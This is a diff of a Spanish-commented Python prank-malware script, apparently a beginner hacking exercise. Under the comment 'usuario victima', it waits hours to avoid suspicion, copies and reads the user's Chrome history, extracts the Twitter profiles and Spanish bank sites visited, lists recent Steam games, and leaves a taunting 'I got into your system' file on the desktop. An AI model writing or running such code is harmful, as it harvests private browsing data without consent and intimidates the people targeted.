@@ -1,48 +1,55 @@
 #Importamos las librerias necesarias
-import random
-import sqlite3
+
+import os
 from pathlib import Path
+from shutil import copyfile
 from time import sleep
 from random import randrange
+import sqlite3
 import re
+import glob
 
-#Definimos el nombre del archivo para asustar
-HACKER_FILE_NAME = "LEEME.txt"
+HACKER_FILE_NAME = "PARA TI.txt"
 
 
 def get_user_path():
-    #Devolvemos nuestro disco mas la direccion de nuestro usuario
-    user_path = "{}/".format(Path.home())
-    return user_path
+    return "{}/".format(Path.home())
 
 
+#Miramos cuales son los videojuegos con los que juega el usuario victima
+def check_steam_games(hacker_file):
+    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
+    games = []
+    game_paths = glob.glob(steam_path)
+    game_paths.sort(key=os.path.getmtime, reverse=True)
+    for game_path in game_paths:
+        games.append(game_path.split("\\")[-1])
+    hacker_file.write("He visto que has estado jugando ultimamente a {}... Jajaja...".format(", ".join(games[:3])))
+
+
+#Hacemos que el programa espere para no levantar sospechas
 def delay_action():
-    #Dormimos un numero de horas y minutos aleatorios para no velantar sospechas
-    number_of_hours = randrange(1, 4)
-    number_of_minutes = random.randint(1, 60)
-    print("Durmiendo {} horas y {} minutos.".format(number_of_hours, number_of_minutes))
-    sleep(3)
+    n_hours = randrange(1, 4)
+    print("Durmiendo {} horas".format(n_hours))
+    sleep(n_hours * 60 * 60)
 
 
+#Creamos el fichero de brominola
 def create_hacker_file(user_path):
-    try:
-        hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "w")
-        hacker_file.write("Hola crack! Soy un ñaker y me he colado en tu sistema \n")
-        hacker_file.close()
-        return hacker_file
-    except:
-        hacker_file = open(HACKER_FILE_NAME, "w")
-        hacker_file.write("Hola crack! Soy un ñaker y me he colado en tu sistema \n")
-        hacker_file.close()
-        return hacker_file
+    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
+    hacker_file.write("Hola crack! Soy un ñaker y me he colado en tu sistema. A que mola?\n")
+    return hacker_file
 
 
+#Conseguimos el historial de Google del usuario
 def get_chrome_history(user_path):
     urls = None
     while not urls:
         try:
             history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
-            connection = sqlite3.connect(history_path)
+            temp_history = history_path + "temp"
+            copyfile(history_path, temp_history)
+            connection = sqlite3.connect(temp_history)
             cursor = connection.cursor()
             cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
             urls = cursor.fetchall()
@@ -52,8 +59,8 @@ def get_chrome_history(user_path):
             print("Historial inaccesible, reintentando en 3 segundos...")
             sleep(3)
 
-
-def check_visited_profiles_and_scare_user(hacker_file, chrome_history, user_path):
+#Miramos en que perfiles de Twitter y otras plataformas ha entrado
+def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
     profiles_visited = []
     for item in chrome_history:
         results_of_twitter = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
@@ -70,32 +77,41 @@ def check_visited_profiles_and_scare_user(hacker_file, chrome_history, user_path
 
         if results and results[0] not in ["notificacions", "home"] and results[0] not in profiles_visited:
             profiles_visited.append(results[0])
-    try:
-        hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "a")
-        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
-        hacker_file.close()
-    except:
-        hacker_file = open(HACKER_FILE_NAME, "a")
-        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
-        hacker_file.close()
+    if profiles_visited:
+        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...\n".format(", ".join(profiles_visited)))
+    else:
+        pass
 
 
+#Miramos que bancos ha visitado recientemente
+def check_bank_account(hacker_file, chrome_history):
+    his_bank = None
+    banks = ["BBVA", "CaixaBank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
+    for item in chrome_history:
+        for b in banks:
+            if b.lower() in item[0].lower():
+                his_bank = b
+                break
+        if his_bank:
+            break
+    hacker_file.write("Además veo que has visitado los bancos {}... Interesante...\n".format(his_bank))
+
+#Bucle principal que ejecuta todas las funciones
 def main():
-    # Esperamos entre 1-3 horas para no levantar sospechas
+    # Esperaremos entre 1 y 3 horas para no levantar sospechas
     delay_action()
-
-    # Calculamos la ruta del usuario de windows
+    # Calculamos la ruta del usuario de Windows
     user_path = get_user_path()
-
-    # Recogemos su historial de Google Chrome (cuando sea posible)
+    # Recogemos su historial de google chrome, cuando sea posible...
     chrome_history = get_chrome_history(user_path)
-
     # Creamos un archivo en el escritorio
     hacker_file = create_hacker_file(user_path)
-
     # Escribiendo mensajes de miedo
-    check_visited_profiles_and_scare_user(hacker_file, chrome_history, user_path)
+    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
+    check_bank_account(hacker_file, chrome_history)
+    check_steam_games(hacker_file)
 
 
+#Ejecutamos el bucle principal
 if __name__ == "__main__":
     main()
